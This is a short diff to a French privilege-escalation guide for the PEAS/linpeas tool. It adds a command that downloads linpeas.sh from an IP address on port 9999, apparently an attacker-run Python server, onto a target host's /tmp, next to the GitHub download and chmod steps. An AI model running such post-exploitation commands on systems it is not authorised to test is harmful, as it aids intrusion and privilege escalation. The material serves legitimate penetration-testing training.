@@ -25,6 +25,7 @@ Guide exhaustif pour l'énumération et l'escalade de privilèges avec PEAS.
 # Télécharger
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+curl http://10.10.17.219:9999/linpeas.sh -o /tmp/linpeas.sh # via server python
 
 # Exécution
 chmod +x linpeas.sh
